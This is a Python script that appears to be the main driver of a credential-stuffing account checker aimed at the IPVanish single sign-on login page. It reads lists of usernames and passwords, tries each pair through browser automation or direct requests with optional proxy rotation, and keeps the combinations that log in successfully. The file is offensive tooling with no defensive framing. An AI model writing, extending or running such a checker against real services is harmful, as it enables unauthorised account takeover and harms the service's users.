import time
from gui import sub_menu
from gui import text_user_interface
from browser_init import BrowserInit
from requests_checker import RequestsChecker

if __name__ == '__main__':
    directory = "/home/roberto/Desktop/cookie.json"
    page = "https://sso.ipvanish.com/"
    is_using_proxies = False
    proxy_user, proxy_password = None, None
    loop_ends = False
    counter = 0
    while not loop_ends:
        TUI = text_user_interface(is_using_proxies)
        match TUI:
            case "1":
                while True:
                    browser = BrowserInit(page)
                    user, password = browser.get_and_split_list()
                    if counter == len(user):
                        loop_ends = True
                        break
                    browser.open_page_and_enter_credentials(user[counter], password[counter])
                    time.sleep(2)
                    browser.check_validity_and_store_if_valid(user[counter], password[counter])
                    counter += 1
            case "2":
                index = 0
                while True:
                    fast_checker = RequestsChecker()
                    user, password = fast_checker.split_list()
                    if counter == len(user):
                        loop_ends = True
                        break
                    fast_checker.make_request(user[counter], password[counter], index)
                    counter += 1
                    if index == 22:
                        index = 0
                    else:
                        index += 1
            case "3":
                proxy_user, proxy_password = sub_menu()
                is_using_proxies = True
            case "4":
                print("\nThanks for playing.")
                exit()
            case _:
                print("Invalid Choice.")
                input("Press Enter...")
                print("\x1bc")
